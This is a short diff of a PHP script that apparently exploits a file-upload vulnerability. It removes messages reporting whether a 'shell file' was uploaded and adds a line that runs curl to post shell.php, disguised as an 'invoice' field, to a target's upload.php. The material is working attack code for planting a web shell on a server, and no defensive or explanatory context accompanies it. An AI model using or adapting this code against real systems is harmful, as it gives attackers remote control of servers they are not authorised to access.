@@ -110,13 +110,9 @@ curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
 //Execute the POST request and print out the result.
 curl_exec($curl);
 
-//Check for errors!
-if(curl_errno($curl)){
-	echo "Failure of uploading shell file...\n";
-    throw new Exception(curl_error($curl));
-} else{
-	echo "Success of uploading shell file!\n";
-}
+
+$cmd = "curl -F 'invoice=@shell.php' ". IP_ADDRESS . "upload.php";
+$result = shell_exec ($cmd);
 
 
 curl_close($curl);
